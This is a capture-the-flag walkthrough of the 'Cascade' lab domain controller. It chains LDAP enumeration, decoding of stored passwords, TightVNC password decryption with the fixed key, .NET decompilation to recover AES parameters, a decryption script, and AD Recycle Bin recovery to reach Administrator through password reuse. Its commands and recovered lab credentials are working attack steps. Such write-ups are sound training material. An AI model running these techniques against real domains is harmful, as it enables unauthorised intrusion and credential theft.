# Cascade

---

## Enumeration

Performed a nmap scan on 10.129.62.175:

```bash
sudo nmap -sV 10.129.62.175
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 18:26:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49163/tcp open  msrpc         Microsoft Windows RPC
```

---

## LDAP User Enumeration

Anonymous LDAP enumeration retrieves domain users:

```bash
nxc ldap 10.129.62.175 -u '' -p '' --users
```

```
LDAP   10.129.62.175  389  CASC-DC1  CascGuest      <never>             0  Built-in account for guest access
LDAP   10.129.62.175  389  CASC-DC1  arksvc          2020-01-09 11:18:20 0
LDAP   10.129.62.175  389  CASC-DC1  s.smith         2020-01-28 14:58:05 0
LDAP   10.129.62.175  389  CASC-DC1  r.thompson      2020-01-09 14:31:26 0
LDAP   10.129.62.175  389  CASC-DC1  util            2020-01-12 21:07:11 0
LDAP   10.129.62.175  389  CASC-DC1  j.wakefield     2020-01-09 15:34:44 0
LDAP   10.129.62.175  389  CASC-DC1  s.hickson       2020-01-12 20:24:27 0
LDAP   10.129.62.175  389  CASC-DC1  j.goodhand      2020-01-12 20:40:26 0
LDAP   10.129.62.175  389  CASC-DC1  a.turnbull      2020-01-12 20:43:13 0
LDAP   10.129.62.175  389  CASC-DC1  e.crowe         2020-01-12 22:45:02 0
LDAP   10.129.62.175  389  CASC-DC1  b.hanson        2020-01-13 11:35:39 0
LDAP   10.129.62.175  389  CASC-DC1  d.burman        2020-01-13 11:36:12 0
LDAP   10.129.62.175  389  CASC-DC1  BackupSvc       2020-01-13 11:37:03 0
LDAP   10.129.62.175  389  CASC-DC1  j.allen         2020-01-13 12:23:59 0
LDAP   10.129.62.175  389  CASC-DC1  i.croft         2020-01-15 16:46:21 0
```

Let's check for users with PASSWD_NOTREQD flag:

```bash
nxc ldap 10.129.62.175 -u '' -p '' --password-not-required
```

```
LDAP   10.129.62.175  389  CASC-DC1  User: a.turnbull Status: enabled
```

User a.turnbull is an enabled account that does not require a password.

---

## LDAP Deep Enumeration — Custom Attributes

Let's perform a full LDAP query using a.turnbull's empty password bind to enumerate all user attributes:

```bash
ldapsearch -x -H ldap://10.129.62.175 -D 'a.turnbull@cascade.local' -w '' -b 'DC=cascade,DC=local' '(objectClass=user)'
```

In r.thompson's entry we find a custom attribute with a base64-encoded password:

```
cascadeLegacyPwd: clk0bjVldmE=
```

Let's decode it:

```bash
echo 'clk0bjVldmE=' | base64 -d
```

> **r.thompson : rY4n5eva**

Let's validate it against the DC:

```bash
nxc smb 10.129.62.175 -u 'r.thompson' -p 'rY4n5eva'
```

---

## SMB Enumeration as r.thompson

Let's list available shares:

```bash
nxc smb 10.129.62.175 -u 'r.thompson' -p 'rY4n5eva' --shares
```

Let's explore the Data share:

```bash
smbclient //10.129.62.175/Data -U 'r.thompson%rY4n5eva'
```

We find two interesting files:

**1) `IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log`**

```
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

The log shows that a **TempAdmin** account was deleted and moved to the AD Recycle Bin by user ArkSvc. We'll need ArkSvc's credentials to query the Recycle Bin later.

**2) `IT/Temp/s.smith/VNC Install.reg`**

Inside we find a TightVNC registry export with an encrypted password:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

---

## VNC Password Decryption → s.smith

TightVNC encrypts passwords with a fixed DES key that is publicly known. Let's decrypt it using Metasploit's IRB:

```bash
msfconsole -q
```

```ruby
irb
require 'rex/proto/rfb'
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
Rex::Proto::RFB::Cipher.decrypt(['6bcf2a4b6e5aca0f'].pack('H*'), fixedkey)
=> "sT333ve2"
```

Let's validate it against the DC:

```bash
nxc smb 10.129.62.175 -u 's.smith' -p 'sT333ve2'
```

```
SMB  10.129.62.175  445  CASC-DC1  [+] cascade.local\s.smith:sT333ve2
```

---

## User Flag

Let's connect with Evil-WinRM:

```bash
evil-winrm -i 10.129.62.175 -u s.smith -p sT333ve2
```

**User flag** is on s.smith's Desktop.

---

## Logon Script → Audit$ Share

Checking s.smith's permissions with `whoami /all` and `net user s.smith`, we see that s.smith is a member of **IT Audit** and **Data Share** groups, and has a logon script: `MapAuditDrive.vbs`.

Let's retrieve the logon scripts from NETLOGON:

```bash
smbclient \\\\10.129.62.175\\NETLOGON -U s.smith%sT333ve2
```

```
smb: \> get MapAuditDrive.vbs
smb: \> get MapDataDrive.vbs
```

Content of `MapAuditDrive.vbs`:

```vbs
'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit
```

This reveals a hidden share `Audit$` accessible by s.smith. Let's download its contents:

```bash
smbclient //10.129.62.175/Audit$ -U 's.smith%sT333ve2'
```

```
smb: \> get CascAudit.exe
smb: \> get CascCrypto.dll
smb: \> get RunAudit.bat
smb: \> cd DB
smb: \DB\> get Audit.db
```

---

## Audit.db Analysis → Encrypted ArkSvc Password

`RunAudit.bat` reveals that `CascAudit.exe` takes `Audit.db` as input. Let's analyze the database:

```bash
sqlite3 Audit.db
```

```sql
sqlite> .tables
DeletedUserAudit     Ldap     Misc

sqlite> SELECT * FROM Ldap;
```

```
╭────┬────────┬──────────────────────────┬───────────────╮
│ Id │ uname  │           pwd            │    domain     │
╞════╪════════╪══════════════════════════╪═══════════════╡
│  1 │ ArkSvc │ BQO5l5Kj9MdErXx6Q6AGOw== │ cascade.local │
╰────┴────────┴──────────────────────────┴───────────────╯
```

The password is base64-encoded but decoding it returns binary garbage — it's encrypted, not just encoded. We need to decompile `CascAudit.exe` to find how.

---

## .NET Decompilation → Decryption Parameters

The executable is a .NET assembly:

```bash
file CascAudit.exe
```

```
CascAudit.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

Let's decompile it:

```bash
ilspycmd CascAudit.exe
```

In the MainModule we find the key piece:

```csharp
string text3 = Conversions.ToString(sqliteDataReader["Pwd"]);
password = Crypto.DecryptString(text3, "c4scadek3y654321");
```

The encryption key is `c4scadek3y654321`. The `DecryptString` function is in `CascCrypto.dll`:

```bash
ilspycmd CascCrypto.dll
```

```csharp
aes.KeySize = 128;
aes.BlockSize = 128;
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
aes.Mode = CipherMode.CBC;
aes.Key = Encoding.UTF8.GetBytes(Key);
```

All decryption parameters recovered:

|Parameter|Value|
|---|---|
|Algorithm|AES-128|
|Mode|CBC|
|Key|c4scadek3y654321|
|IV|1tdyjCbY1Ix49842|

---

## Decrypting ArkSvc Password

```python
import pyaes
from base64 import b64decode

key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"

aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

```bash
pip3 install pyaes
python3 decrypt.py
```

> **ArkSvc : w3lc0meFr31nd**

---

## AD Recycle Bin → TempAdmin

Let's connect as ArkSvc:

```bash
evil-winrm -i 10.129.62.175 -u ArkSvc -p w3lc0meFr31nd
```

ArkSvc has the **AD Recycle Bin** privilege. Let's query deleted objects to retrieve TempAdmin:

```powershell
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
```

TempAdmin appears among the deleted objects. Let's extract all its properties:

```powershell
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```

In the output we find the same custom attribute seen earlier on r.thompson:

```
cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
```

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
```

> **TempAdmin : baCT3r1aN00dles**

---

## Root Flag

TempAdmin is deleted, so we can't authenticate with it directly. However, an email found earlier in the Data share states that TempAdmin was created with the same password as the Administrator account. Let's try it:

```bash
evil-winrm -i 10.129.62.175 -u Administrator -p baCT3r1aN00dles
```

**Root flag** is on the Administrator's Desktop.
